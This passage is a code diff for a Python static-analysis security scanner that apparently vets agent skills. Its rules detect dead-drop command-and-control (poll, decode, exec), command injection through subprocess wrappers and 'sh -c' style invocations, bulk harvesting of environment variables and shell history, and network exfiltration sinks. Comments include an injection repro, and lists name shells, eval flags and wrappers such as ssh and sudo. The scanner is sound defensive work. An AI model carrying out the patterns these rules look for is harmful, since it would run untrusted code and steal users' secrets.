+    scopes.extend(n for n in ast.walk(tree) if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef)))
+
+    confirmed: list[tuple[int, str]] = []
+    exec_sink_present = False
+    first_sink_lineno = 0
+    for scope in scopes:
+        fetch_tainted = _deaddrop_fetch_tainted_names(scope)
+        decode_tainted = _deaddrop_decode_tainted_names(scope, fetch_tainted)
+        for node in _scope_own_nodes(scope):
+            if not isinstance(node, ast.Call):
+                continue
+            is_exec, sink_name = _is_exec_sink_call(node.func)
+            if not is_exec:
+                continue
+            exec_sink_present = True
+            ln = getattr(node, "lineno", 0)
+            if not first_sink_lineno:
+                first_sink_lineno = ln
+            args = list(node.args) + [kw.value for kw in node.keywords]
+            # F-159 follow-up: for subprocess.* alone, narrow which of the call's own
+            # argument sub-expressions count as a genuine "decoded value IS the
+            # executed thing" hit down to COMMAND position — see
+            # _deaddrop_subprocess_command_parts's docstring. eval/exec/os.system/
+            # os.popen have no such position (their whole argument IS the code/shell
+            # command), so `hit_args` stays the full argument list for those.
+            hit_args = args
+            if sink_name.startswith("subprocess."):
+                command_parts = _deaddrop_subprocess_command_parts(
+                    node, bindings_by_call.get(node)
+                )
+                if command_parts is not None:
+                    hit_args = command_parts
+            direct_hit = bool(decode_tainted) and any(_names_in(a) & decode_tainted for a in hit_args)
+            inline_hit = any(
+                _is_decode_primitive_call(sub)
+                and bool(sub.args)
+                and bool(_names_in(sub.args[0]) & fetch_tainted or _expr_reads_remote(sub.args[0]))
+                for a in hit_args
+                for sub in ast.walk(a)
+            )
+            if direct_hit or inline_hit:
+                confirmed.append(
+                    (
+                        ln,
+                        "content polled from a remote source on a timer is decoded and the "
+                        f"decoded value reaches {sink_name}() — dead-drop C2 resolver shape "
+                        "(poll -> decode -> exec)",
+                    )
+                )
+    if confirmed:
+        return confirmed, []
+    if exec_sink_present:
+        return (
+            [],
+            [
+                (
+                    first_sink_lineno,
+                    "a periodic network poll, a decode primitive, and an exec sink are "
+                    "all present in this file, but no exec sink call is confirmed to "
+                    "run the decoded value as its executed command/payload (at most an "
+                    "inert data argument to a fixed program) — possible dead-drop C2 "
+                    "resolver composition (ambiguous)",
+                )
+            ],
+        )
+    return [], []
+
+
+def _func_param_taint_by_scope(tree: ast.AST, owner_map: dict, parent_scope: dict) -> dict:
+    """B-413 layer 1: seed each function's OWN parameter names into its OWN taint
+    bucket -- the scope-bucketed replacement for the old `_collect_func_params`, whose
+    single flat `set[str]` let a parameter in one function taint an unrelated
+    same-named local in a completely different function (SkillTrustBench case_00374:
+    `_venv_python(venv_dir)`'s parameter falsely tainted an unrelated `venv_dir` local
+    in `main()`, a deterministic `__file__`-derived path), or let a generic name
+    (`missing`/`data`/`result`) reused across sibling functions collide (case_01948).
+
+    Returns a dict keyed by owning scope node (mirrors `_tainted_names`'s bucketing:
+    a function at any nesting depth, a top-level class's own method, or `None` for
+    module-level code). A function that `_build_toplevel_owner_map` never reached --
+    it is seeded from `tree.body`'s own top-level funcs/classes only, so a function
+    nested inside a bare module-level `if`/`try` (not inside a class or another
+    function) is invisible to it -- falls back to the `None` (module) bucket rather
+    than being silently dropped: losing the seed entirely would be a false NEGATIVE
+    (an untracked parameter would then read as untainted everywhere), so the
+    conservative direction here is to over-taint, not under-taint.
+
+    C-135 (round 1, self-review at implementation time): a scope-count safety cap
+    that redirected excess scopes to the shared `None` bucket was attempted here and
+    RETRACTED before shipping -- an independent adversarial pass proved it a real,
+    reproducible detection-loss regression, not the "fails toward crit" safety valve
+    its own comment claimed. `_tainted_names_visible`'s shadow-subtraction (correct
+    for its ORIGINAL purpose -- a local rebinding shadows an unrelated outer-scope
+    taint source of the same name) treats a scope's own parameter binding as shadowing
+    the module bucket's same-named entry, so a param whose seed was dumped into `None`
+    by the cap became invisible inside its OWN owning function -- the one place it is
+    genuinely, unambiguously tainted. Confirmed via an unmodified-default-cap repro (a
+    ~6,000-line file, 2001 throwaway functions followed by one real tainted
+    `subprocess.call(cmd, shell=True)` wrapper) that TT5_CMD_INJECTION silently never
+    fired, where the pre-B-413 flat model correctly caught it. No cap is applied here;
+    an unbounded scope count was measured (same adversarial pass) to cost real time
+    but not memory (no product/powerset structure, unlike the `_EffectSimulator`
+    B-192 blowup this file already guards against elsewhere) -- the project's
+    existing `ScanBudgetExceeded`/`check_deadline` wall-clock budget, which already
+    wraps the check pipeline, is the correct backstop for that cost, not a
+    correctness-affecting cap invented here.
+    """
+    taint: dict = {}
+    for fn in ast.walk(tree):
+        if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
+            continue
+        # A function becomes its OWN scope bucket iff `_build_toplevel_owner_map`
+        # actually walked it -- in which case owner_map[fn] is fn itself (see that
+        # function's docstring: every FunctionDef/AsyncFunctionDef it reaches maps to
+        # itself) and fn is a key of parent_scope. Anything else (unreached by the
+        # owner-map walk) is not one of "owner_map's scope set" and falls to None.
+        scope = owner_map.get(fn)
+        is_own_scope = scope is fn and fn in parent_scope
+        bucket = scope if is_own_scope else None
+
+        args = fn.args
+        names = {a.arg for a in (*args.posonlyargs, *args.args, *args.kwonlyargs)}
+        if args.vararg:
+            names.add(args.vararg.arg)
+        if args.kwarg:
+            names.add(args.kwarg.arg)
+        if names:
+            taint.setdefault(bucket, set()).update(names)
+    return taint
 
 
 def _is_exec_sink_call(func: ast.AST) -> tuple:
@@ -866,6 +1540,24 @@ def _call_args_tainted(node: ast.Call, tainted: set[str]) -> tuple:
 # module must stop here. Shared by `_scope_own_nodes` and `_own_bound_names` so the two
 # cannot drift apart again (B-214 follow-up: they did, and it cost a crit false FAIL).
 _NESTED_SCOPE_NODES = (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef, ast.Lambda)
+
+# B-414: comprehensions (list/set/dict/generator) are ALSO a real Python 3 scope -- a
+# `for` target inside one is local to the comprehension, not the enclosing function --
+# but they are deliberately kept OUT of `_NESTED_SCOPE_NODES` rather than added to it.
+# `_NESTED_SCOPE_NODES` also gates `_scope_own_nodes`, which `_single_list_bindings_local`/
+# `_list_bindings_by_call` (B-413 layer 2's argv-list resolution) and
+# `_function_composes_decode` (TT4) rely on to see every call/assignment "belonging to"
+# a function, INCLUDING ones textually nested inside a comprehension in that function's
+# body (`cmd = [...]; [subprocess.run(cmd) for _ in batch]`). Folding comprehensions into
+# that boundary too would silently stop `_list_bindings_by_call` from resolving such a
+# call's argv list at all (`list_bindings_by_call.get(node)` -> None), which
+# `_subprocess_taint_is_command_injection` reads as "unresolved" and defaults to crit --
+# trading this ticket's false CRITICAL for a DIFFERENT one on a real, common pattern.
+# So comprehension scoping is scoped narrowly to the taint/shadow model that actually
+# has the bug (`_own_bound_names`, `_build_toplevel_owner_map`, `_external_tainted_names`
+# below), via this separate constant, leaving `_scope_own_nodes` and its consumers
+# untouched.
+_COMPREHENSION_SCOPE_NODES = (ast.ListComp, ast.SetComp, ast.DictComp, ast.GeneratorExp)
 
 
 def _enclosing_evaluated_parts(node: ast.AST) -> list:
@@ -976,21 +1668,272 @@ def _list_bindings_by_call(tree: ast.AST) -> dict[ast.Call, dict[str, ast.List |
     return out
 
 
+# B-413 layer 2 safety cap: a wrapper function with more intra-file call sites than
+# this is treated as UNRESOLVABLE (stays crit) rather than scanned in full -- a hard
+# cap on cost, not a soft one. Exposed as a module constant so tests can monkeypatch
+# a small threshold instead of generating 200+ call sites.
+_MAX_WRAPPER_CALL_SITES = 200
+
+
+def _param_argv_call_sites(
+    fn: ast.AST, param_name: str, tree: ast.AST, owner_map: dict
+) -> list | None:
+    """B-413 layer 2: the argument expression bound to `fn`'s `param_name` at EVERY
+    intra-file call to `fn` -- the call-site view of the ordinary, encouraged wrapper
+    idiom (`def run(cmd): subprocess.check_call(cmd, cwd=ROOT)`) that a purely
+    intra-function taint model (layer 1) cannot clear, since the parameter genuinely
+    IS tainted in `fn`'s own scope (that part of layer 1 is correct); only the CALL
+    SITES can prove every real invocation is actually safe.
+
+    Returns None (unresolvable -> the caller must stay conservative / crit) whenever
+    anything about the binding cannot be proven safe by a simple, SOUND static match
+    -- soundness here means "never wrongly conclude safe", so every ambiguous case
+    bails rather than guesses:
+
+      * `fn` is not a bare top-level FunctionDef/AsyncFunctionDef (a nested function
+        or a class method is out of scope for this narrow fix);
+      * `fn` itself takes `*args`/`**kwargs` (the position of `param_name` cannot be
+        pinned down for every caller);
+      * `fn`'s name is not unique at module level (two top-level defs sharing a name
+        -- which real caller means?);
+      * `param_name` cannot be located in `fn`'s own positional/keyword-or-positional/
+        keyword-only parameter list;
+      * `fn`'s bare NAME is referenced anywhere in the file OTHER than as the `func`
+        of a Call to it -- passed as a value/callback/re-assigned (`f = run`) is an
+        indirect call this walk cannot see, so it must not silently ignore it;
+      * ANY call site to `fn` uses `*args`/`**kwargs` unpacking -- positional
+        resolution is not safe to assume;
+      * a call site does not bind `param_name` at all (relies on `fn`'s own default
+        value) -- not modelled here, bail rather than assume the default is safe;
+      * more than `_MAX_WRAPPER_CALL_SITES` intra-file call sites (a hard cost cap);
+      * ZERO call sites are found -- load-bearing: a helper with no intra-file caller
+        is genuinely unknown from outside the file and MUST stay crit.
+
+    This walk is deliberately NOT scope-precise about which `fn`-named reference goes
+    with which `fn` (it matches every `ast.Name(id=fn.name)` in the whole file, not
+    just ones actually resolving to `fn` under Python's real scoping) -- a same-named
+    nested closure or unrelated local could, in principle, add noise. That noise can
+    only make this MORE conservative (an extra call site or an extra "used as a
+    value" hit only ever pushes the result toward None/False, i.e. toward staying
+    crit), never less -- so it stays sound without needing full scope resolution here.
+    """
+    if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
+        return None
+    if fn not in getattr(tree, "body", []):
+        return None  # not a bare top-level function
+    args = fn.args
+    if args.vararg or args.kwarg:
+        return None
+
+    fn_name = fn.name
+    toplevel_defs_named = [
+        n
+        for n in tree.body
+        if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef)) and n.name == fn_name
+    ]
+    if len(toplevel_defs_named) != 1:
+        return None  # name not unique at module level
+
+    positional_names = [a.arg for a in (*args.posonlyargs, *args.args)]
+    kwonly_names = {a.arg for a in args.kwonlyargs}
+    if param_name in positional_names:
+        pos_index = positional_names.index(param_name)
+    elif param_name in kwonly_names:
+        pos_index = None  # keyword-only -- must be bound by keyword at every call site
+    else:
+        return None
+
+    all_name_refs = [n for n in ast.walk(tree) if isinstance(n, ast.Name) and n.id == fn_name]
+    all_calls = [
+        n
+        for n in ast.walk(tree)
+        if isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id == fn_name
+    ]
+    call_func_ids = {id(c.func) for c in all_calls}
+    for ref in all_name_refs:
+        if id(ref) not in call_func_ids:
+            return None  # used as a value somewhere other than Call.func -- bail
+
+    if not all_calls:
+        return None  # zero call sites -- stays crit, load-bearing
+    if len(all_calls) > _MAX_WRAPPER_CALL_SITES:
+        return None  # cost cap -- stays crit
+
+    bound_exprs: list = []
+    for call in all_calls:
+        if any(isinstance(a, ast.Starred) for a in call.args):
+            return None
+        if any(kw.arg is None for kw in call.keywords):  # **kwargs unpack at the call
+            return None
+        kw_match = next((kw.value for kw in call.keywords if kw.arg == param_name), None)
+        if kw_match is not None:
+            bound_exprs.append(kw_match)
+            continue
+        if pos_index is None:
+            return None  # keyword-only param not passed by keyword here -- relies on
+            # fn's own default; not modelled, bail rather than assume it is safe
+        if pos_index < len(call.args):
+            bound_exprs.append(call.args[pos_index])
+        else:
+            return None  # relies on fn's default value -- not modelled, bail
+    return bound_exprs
+
+
+# B-413 layer 2 (C-135 round 1, self-review at implementation time): checking only
+# argv[0] for taint was RETRACTED-AND-NARROWED here after an independent adversarial
+# pass proved it a real, reproducible false-negative regression, not just a
+# theoretical gap. When argv[0] names a shell or another indirect-execution
+# interpreter, the REST of the argv list is not inert execve data -- it is text the
+# interpreter itself parses and runs, so a tainted value anywhere in argv[1:] is
+# genuine command injection even though argv[0] is a hardcoded, innocuous-looking
+# literal. Concrete repro that motivated this: `def run(cmd): subprocess.check_call
+# (cmd)` called as `run(["sh", "-c", os.environ["WEBHOOK_PAYLOAD"]])` -- argv[0] is
+# the constant "sh", so the pre-fix check certified the call site "fixed" and
+# downgraded a CRITICAL command injection to an informational finding.
+#
+# C-135 (2nd round, self-caught in integration): a first cut of this fix treated
+# EVERY invocation of a general-purpose interpreter (python/perl/ruby/node/...) as
+# dangerous whenever ANY later argv element was tainted -- but `python -m edge_tts
+# --text {text} --voice {voice}` (a real, previously-correctly-PASSing fixture,
+# clean_b13_fixed_argv_subprocess) passes `text`/`voice` as ORDINARY CLI ARGUMENTS
+# to a well-behaved module, not as code for python to execute; that flipped a
+# genuinely safe skill to FAIL. Fixed by splitting into two categories:
+#   * _SHELL_EVAL_FLAG_INTERPRETERS -- general scripting-language interpreters and
+#     shells that CAN take an "execute this string as code" flag but usually don't;
+#     these only count as dangerous when such a flag (_EVAL_FLAG_NAMES) is ALSO
+#     present somewhere in the argv, matching the exact "sh -c <tainted>" shape that
+#     motivated this fix without over-matching ordinary "<interpreter> script.py
+#     --flag value" invocations.
+#   * _REEXEC_WRAPPER_NAMES -- commands whose basic invocation shape already treats
+#     everything after argv[0] (or, for `find`, everything after `-exec`) as a
+#     command to run, with no extra flag needed: `env CMD ARGS...`, `sudo CMD
+#     ARGS...`, `ssh HOST CMD` are dangerous by construction, not merely "can be
+#     misused via a flag".
+_SHELL_EVAL_FLAG_INTERPRETERS = frozenset({
+    "sh", "bash", "zsh", "ksh", "dash", "csh", "tcsh", "ash",
+    "cmd", "cmd.exe", "powershell", "powershell.exe", "pwsh",
+    "python", "python2", "python3", "perl", "ruby", "php", "node", "deno",
+})
+_EVAL_FLAG_NAMES = frozenset({"-c", "-e", "--eval", "/c", "-command", "--command"})
+_REEXEC_WRAPPER_NAMES = frozenset({"env", "sudo", "doas", "nohup", "ssh"})
+
+
+def _argv0_is_shell_indirect_exec(elts: list) -> bool:
+    """True when literal argv[0] of *elts* names a shell/interpreter or another
+    program whose invocation shape means LATER argv elements are not inert execve
+    data -- either it always re-execs its trailing args as a new command
+    (`_REEXEC_WRAPPER_NAMES`), or it is a scripting interpreter/shell actually
+    invoked with an explicit "run this string" flag (`_SHELL_EVAL_FLAG_INTERPRETERS`
+    + `_EVAL_FLAG_NAMES` present somewhere in the SAME argv) -- an interpreter
+    invoked WITHOUT such a flag (`python -m mod --flag value`) is an ordinary
+    program call whose own args are just data to it, not code."""
+    if not elts:
+        return False
+    prog = elts[0]
+    if not isinstance(prog, ast.Constant) or not isinstance(prog.value, str):
+        return False
+    basename = prog.value.rsplit("/", 1)[-1].rsplit("\\", 1)[-1].lower()
+    if basename in _REEXEC_WRAPPER_NAMES:
+        return True
+    if basename in _SHELL_EVAL_FLAG_INTERPRETERS:
+        return any(
+            isinstance(e, ast.Constant)
+            and isinstance(e.value, str)
+            and e.value.lower() in _EVAL_FLAG_NAMES
+            for e in elts[1:]
+        )
+    return False
+
+
+def _all_call_sites_bind_fixed_argv(
+    bound_exprs: list,
+    list_bindings_by_call: dict,
+    owner_map: dict,
+    ext_taint_map: dict,
+    parent_scope: dict,
+    shadow_cache: dict,
+) -> bool:
+    """B-413 layer 2: True iff EVERY expression in `bound_exprs` (from
+    `_param_argv_call_sites`) is provably a hardcoded command: a non-empty literal
+    List/Tuple (inline, or a bare Name resolved through the EXISTING
+    `_single_list_bindings_local`/`_list_bindings_by_call` machinery) whose
+    program-name element (argv[0]) is untainted in the CALLING scope's own visible
+    taint set -- AND, when argv[0] is itself a shell/indirect-execution interpreter
+    (`_argv0_is_shell_indirect_exec`), every OTHER element is untainted too, since
+    the interpreter re-parses them as its own command text. A single unresolvable,
+    empty, or tainted call site fails the whole check -- the wrapper's parameter
+    stays crit.
+
+    Name resolution reuses `list_bindings_by_call` (already computed once per file by
+    the caller, passed in here -- never recomputed) by re-keying its existing
+    per-CALL entries by SCOPE instead of by call node: `owner_map.get(call_node) is
+    owner_map.get(expr)` always holds for an `expr` that is a direct argument of
+    `call_node` (both are visited in the same scope-subtree walk in
+    `_build_toplevel_owner_map`), so this is a free re-index of already-computed
+    `_single_list_bindings_local` results, not a new computation of them.
+    """
+    if not bound_exprs:
+        return False
+    scope_bindings: dict = {}
+    for call_node, binds in list_bindings_by_call.items():
+        scope_bindings.setdefault(owner_map.get(call_node), binds)
+
+    for expr in bound_exprs:
+        resolved = expr
+        if isinstance(expr, ast.Name):
+            binds = scope_bindings.get(owner_map.get(expr))
+            if binds:
+                resolved = binds.get(expr.id, expr)  # resolve a var-bound command list
+        if not isinstance(resolved, (ast.List, ast.Tuple)) or not resolved.elts:
+            return False  # unresolvable or empty -- not provably a fixed command
+        prog = resolved.elts[0]
+        visible = _tainted_names_visible(expr, ext_taint_map, owner_map, parent_scope, shadow_cache)
+        if _names_in(prog) & visible:
+            return False  # tainted program name at THIS call site -> stays crit
+        if _argv0_is_shell_indirect_exec(resolved.elts):
+            rest_names = set()
+            for elt in resolved.elts[1:]:
+                rest_names |= _names_in(elt)
+            if rest_names & visible:
+                return False  # tainted arg handed to a shell/interpreter -> stays crit
+    return True
+
+
 def _subprocess_taint_is_command_injection(
-    node: ast.Call, tainted: set, list_bindings: dict[str, ast.List | ast.Tuple] | None = None
+    node: ast.Call,
+    tainted: set,
+    list_bindings: dict[str, ast.List | ast.Tuple] | None = None,
+    *,
+    tree: ast.AST | None = None,
+    owner_map: dict | None = None,
+    parent_scope: dict | None = None,
+    shadow_cache: dict | None = None,
+    ext_taint_map: dict | None = None,
+    list_bindings_by_call: dict | None = None,
 ) -> bool:
     """For a subprocess.* call with tainted input, is it command-injection grade?
 
     True  -> shell=True (or a non-literal shell value), OR a non-list first arg
-             (string command / tainted program path), OR the program element argv[0]
-             is itself tainted.
+             (string command / tainted program path) that layer 2 cannot clear, OR
+             the program element argv[0] is itself tainted.
     False -> argv-list form with shell not True and a fixed (untainted) program — the
              tainted value is only a non-program argument. That is argument injection
              (low risk: metacharacters are literal argv data passed to execve), NOT
              command injection. Regression guard for the B13 false-positive class.
+             ALSO False (B-413 layer 2) when `first` is the wrapper's OWN bare
+             parameter Name and EVERY intra-file call site to the wrapper binds that
+             parameter to a fully-literal, untainted-program argv list -- the
+             ordinary `def run(cmd): subprocess.check_call(cmd, ...)` idiom, where
+             `cmd` is genuinely tainted from `run`'s own perspective (layer 1 is
+             correct about that) but every real invocation is hardcoded.
 
     The argv list may be inline (`run([prog, arg])`) or bound to a local resolved via
     ``list_bindings`` (`cmd = [prog, arg]; run(cmd)`) — the dominant real-world form.
+
+    The keyword-only `tree`/`owner_map`/`parent_scope`/`shadow_cache`/`ext_taint_map`/
+    `list_bindings_by_call` args are layer 2's extra context; all optional (default
+    None) so this stays callable exactly as before layer 2 existed. Layer 2 is only
+    attempted when every one of them is supplied.
     """
     for kw in node.keywords:
         if kw.arg == "shell":
@@ -1005,7 +1948,40 @@ def _subprocess_taint_is_command_injection(
         prog = first.elts[0] if first.elts else None
         if prog is not None and (_names_in(prog) & tainted):
             return True  # tainted program name -> arbitrary program execution
+        # C-135 (B-413 round 1): argv[0] being untainted is not enough when argv[0]
+        # is ITSELF a shell/indirect-execution interpreter -- the rest of the argv
+        # list is text that interpreter parses and runs, not inert execve data (see
+        # _argv0_is_shell_indirect_exec's docstring, layer 2's identical check below).
+        if _argv0_is_shell_indirect_exec(first.elts):
+            rest_names = set()
+            for elt in first.elts[1:]:
+                rest_names |= _names_in(elt)
+            if rest_names & tainted:
+                return True  # tainted arg handed to a shell/interpreter -> command injection
         return False  # only a non-program argv element is tainted -> argument injection
+
+    # B-413 layer 2: `first` is a bare, unresolved Name -- possibly the wrapper's OWN
+    # parameter, which is genuinely tainted at THIS scope (layer 1 is correct about
+    # that) but may still be safe if EVERY intra-file call site binds it to a
+    # fully-literal argv list with an untainted program name.
+    if (
+        isinstance(first, ast.Name)
+        and tree is not None
+        and owner_map is not None
+        and parent_scope is not None
+        and shadow_cache is not None
+        and ext_taint_map is not None
+        and list_bindings_by_call is not None
+    ):
+        fn = owner_map.get(node)
+        if isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)) and any(
+            a.arg == first.id for a in (*fn.args.posonlyargs, *fn.args.args, *fn.args.kwonlyargs)
+        ):
+            call_sites = _param_argv_call_sites(fn, first.id, tree, owner_map)
+            if call_sites is not None and _all_call_sites_bind_fixed_argv(
+                call_sites, list_bindings_by_call, owner_map, ext_taint_map, parent_scope, shadow_cache
+            ):
+                return False  # every real call site is a hardcoded command
     return True  # string / name / concat first arg -> string command or program path
 
 
@@ -1190,6 +2166,180 @@ def _host_info_tainted_names(tree: ast.AST) -> set[str]:
     return tainted
 
 
+# ---- B-342 (T09/SkillTrustBench V_EXCESSIVE_TELEMETRY) helpers ------------------
+
+
+def _is_bulk_environ_call(node: ast.AST) -> bool:
+    """True for a BULK read of the whole environment -- os.environ.items()/.keys()/
+    .values()/.copy(), dict(os.environ), sorted(os.environ)/list(os.environ) -- as
+    opposed to a single named lookup (os.getenv("X") / os.environ.get("X")), which is
+    the ordinary, non-invasive way a skill reads its own config and is deliberately
+    NOT matched here (that shape is ENV_EXFIL_FLOW's territory, not this rule's)."""
+    if not isinstance(node, ast.Call):
+        return False
+    f = node.func
+
+    def _is_environ_obj(n: ast.AST) -> bool:
+        if isinstance(n, ast.Attribute) and n.attr == "environ" and _attr_base(n.value) == "os":
+            return True
+        return isinstance(n, ast.Name) and n.id == "environ"
+
+    if isinstance(f, ast.Attribute) and f.attr in ("items", "keys", "values", "copy"):
+        return _is_environ_obj(f.value)
+    if isinstance(f, ast.Name) and f.id in ("dict", "sorted", "list"):
+        return bool(node.args) and _is_environ_obj(node.args[0])
+    return False
+
+
+def _is_bulk_fs_walk_call(node: ast.AST) -> bool:
+    """True for a recursive/bulk filesystem enumeration: os.walk(...), <expr>.rglob(...),
+    or glob.glob(..., recursive=True)."""
+    if not isinstance(node, ast.Call):
+        return False
+    f = node.func
+    if not isinstance(f, ast.Attribute):
+        return False
+    if f.attr == "walk" and _attr_base(f.value) == "os":
+        return True
+    if f.attr == "rglob":
+        return True
+    if f.attr == "glob" and _attr_base(f.value) == "glob":
+        return any(
+            kw.arg == "recursive"
+            and isinstance(kw.value, ast.Constant)
+            and kw.value.value is True
+            for kw in node.keywords
+        )
+    return False
+
+
+def _is_bulk_dir_listing_call(node: ast.AST) -> bool:
+    """True for os.listdir(...) / <expr>.iterdir() -- a bulk directory-contents read,
+    as opposed to checking/opening one named file."""
+    if not isinstance(node, ast.Call):
+        return False
+    f = node.func
+    if not isinstance(f, ast.Attribute):
+        return False
+    if f.attr == "listdir" and _attr_base(f.value) == "os":
+        return True
+    return f.attr == "iterdir"
+
+
+def _function_has_history_file_read(fn: ast.AST) -> bool:
+    """True when *fn*'s body both names a shell/command-history file (.bash_history,
+    .zsh_history, .python_history, ...) as a string constant AND contains a file-read
+    call -- a same-function co-occurrence check (not a precise path-to-read dataflow
+    connection), matching this rule's per-function-not-per-call precision level."""
+    has_literal = any(
+        isinstance(n, ast.Constant)
+        and isinstance(n.value, str)
+        and _HISTORY_FILENAME_RE.search(n.value)
+        for n in ast.walk(fn)
+    )
+    if not has_literal:
+        return False
+    return any(
+        (isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute) and n.func.attr in _FILE_READ_METHOD_ATTRS)
+        or (isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id in _FILE_OPEN_NAMES)
+        for n in ast.walk(fn)
+    )
+
+
+def _telemetry_overcollection_categories(fn: ast.AST) -> set[str]:
+    """The distinct over-collection axes (env/fswalk/dirlist/history) directly present
+    anywhere in *fn*'s body."""
+    cats: set[str] = set()
+    for n in ast.walk(fn):
+        if _is_bulk_environ_call(n):
+            cats.add("env")
+        elif _is_bulk_fs_walk_call(n):
+            cats.add("fswalk")
+        elif _is_bulk_dir_listing_call(n):
+            cats.add("dirlist")
+    if _function_has_history_file_read(fn):
+        cats.add("history")
+    return cats
+
+
+def _telemetry_collector_funcnames(tree: ast.AST) -> set[str]:
+    """Top-level function/method names whose OWN body combines >=2 distinct
+    over-collection axes -- see the EXCESSIVE_TELEMETRY_FLOW comment above for why
+    two axes, not one, is the bar."""
+    names: set[str] = set()
+    for node in ast.walk(tree):
+        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
+            if len(_telemetry_overcollection_categories(node)) >= 2:
+                names.add(node.name)
+    return names
+
+
+def _telemetry_tainted_names(tree: ast.AST, collector_funcs: set[str]) -> set[str]:
+    """Names whose value derives (transitively, name-based) from calling one of
+    *collector_funcs* -- same assignment-fixpoint shape as _host_info_tainted_names,
+    sourced from a call to a known over-collection function instead of a single
+    built-in call.
+
+    Also seeds taint at CALL SITES, not just assignments: ``send(collect())`` passes
+    the collector's return value directly as an argument, with no intermediate
+    variable for the assignment scan above to ever see. Every corpus sample this rule
+    targets uses the two-function collect/send split, and both the assign-then-call
+    form (``data = collect(); send(data)``) and this direct-nested-call form appear in
+    practice, so missing the second halves real recall. When a user-defined function
+    is called with a sourced argument, ALL of its parameter names are tainted together
+    (not matched positionally/by keyword) -- the same name-based, whole-file
+    approximation already used above, not a scope-precise binding."""
+    if not collector_funcs:
+        return set()
+    tainted: set[str] = set()
+    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
+    calls = [n for n in ast.walk(tree) if isinstance(n, ast.Call) and isinstance(n.func, ast.Name)]
+    param_names: dict[str, set[str]] = {}
+    for fn in ast.walk(tree):
+        if isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
+            names = {a.arg for a in fn.args.args} | {a.arg for a in fn.args.kwonlyargs}
+            if fn.args.vararg:
+                names.add(fn.args.vararg.arg)
+            if fn.args.kwarg:
+                names.add(fn.args.kwarg.arg)
+            param_names.setdefault(fn.name, set()).update(names)
+
+    def _is_sourced(subtree: ast.AST) -> bool:
+        return bool(_names_in(subtree) & tainted) or any(
+            isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id in collector_funcs
+            for n in ast.walk(subtree)
+        )
+
+    for _ in range(4):
+        changed = False
+        for a in assigns:
+            if _is_sourced(a.value):
+                for t in a.targets:
+                    if isinstance(t, ast.Name) and t.id not in tainted:
+                        tainted.add(t.id)
+                        changed = True
+                    elif (
+                        isinstance(t, ast.Subscript)
+                        and isinstance(t.value, ast.Name)
+                        and t.value.id not in tainted
+                    ):
+                        tainted.add(t.value.id)
+                        changed = True
+        for c in calls:
+            params = param_names.get(c.func.id)
+            if not params or params <= tainted:
+                continue
+            arg_nodes = [*c.args, *(kw.value for kw in c.keywords)]
+            if any(_is_sourced(arg) for arg in arg_nodes):
+                newly = params - tainted
+                if newly:
+                    tainted |= newly
+                    changed = True
+        if not changed:
+            break
+    return tainted
+
+
 def _has_agent_config_path_const(node: ast.AST) -> bool:
     """True if the subtree contains a string constant naming an agent config file path."""
     for n in ast.walk(node):
@@ -1277,14 +2427,76 @@ def _has_cred_path_const(node: ast.AST) -> bool:
     return False
 
 
-def _is_net_sink(func: ast.AST) -> bool:
+# B-422 follow-up (C-348 adversarial re-review): base-gating put/patch/request on the
+# LITERAL _NET_SINK_BASES names (see the block above) silently kills detection for the
+# overwhelmingly common case of a session/client bound to a non-literal variable name --
+# `s = requests.Session(); s.put(...)`, `client = httpx.Client(); client.request(...)`,
+# `conn = socket.socket(...); conn.connect(...)` -- since _attr_base has no alias/data-flow
+# resolution and none of "s"/"client"/"conn"/"sess" are in _NET_SINK_BASES. That reopened
+# the exact false-negative the original literal-base check already had (it only ever
+# recognized the single spelling "session"), and now spans all five rules _is_net_sink
+# feeds (CRED_EXFIL_FLOW/ENV_EXFIL_FLOW/HOST_INFO_EXFIL_FLOW/CONDITIONAL_SINK/env-auth-kwarg).
+# Fix: resolve a small, explicit alias set per file -- names assigned from a networking-
+# library constructor call (`<base in _NET_SINK_BASES>.<CapitalizedCtor>(...)` or
+# `socket.socket(...)`), plus a short alias-of-alias fixpoint (`s2 = s`) -- and let
+# _is_net_sink treat those names the same as a literal base. Deliberately narrow: only a
+# constructor-shaped call (attr starts uppercase, or the literal "socket" module-level
+# factory) seeds an alias, so an unrelated `x = requests.get(url)` response object does
+# NOT retroactively make `x.put(...)` a sink for something that isn't request-shaped.
+_NET_SINK_CTOR_BASES = frozenset({"socket"})  # base.attr() ctor pairs beyond CapitalCase
+# Full dotted-path spellings (via _dotted_path) recognized as networking constructor
+# MODULES, on top of the single-segment _NET_SINK_BASES lookup. Needed for a submodule
+# whose _attr_base last-segment alone isn't trustworthy as a bare base -- e.g.
+# `http.client.HTTPSConnection(...)`'s base is the Attribute chain `http.client`, whose
+# last segment is "client" (not a name worth matching on its own), but the full path
+# "http.client" unambiguously names the stdlib networking module. http.client is a
+# common dependency-free exfil vector (no `requests`/`httpx` import to catch on),
+# confirmed missed by the C-348 re-review of B-422.
+_NET_SINK_CTOR_MODULE_PATHS = frozenset({"http.client"})
+
+
+def _net_sink_alias_names(tree: ast.AST) -> frozenset[str]:
+    """Names (lowercased, to match _attr_base) transitively assigned from a known
+    networking-library session/client/socket constructor -- so `s = requests.Session()`
+    or `conn = http.client.HTTPSConnection(...)` followed by `s.put(...)` /
+    `conn.request(...)` is still recognized as a network sink even though neither
+    variable is literally named "session". Small fixpoint for simple alias-of-alias
+    chains (`s2 = s`), mirroring _cred_tainted_names' shape."""
+    aliases: set[str] = set()
+    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
+    for _ in range(4):
+        changed = False
+        for a in assigns:
+            rhs = a.value
+            is_known_ctor_module = isinstance(rhs, ast.Call) and isinstance(
+                rhs.func, ast.Attribute
+            ) and (
+                _attr_base(rhs.func.value) in _NET_SINK_BASES
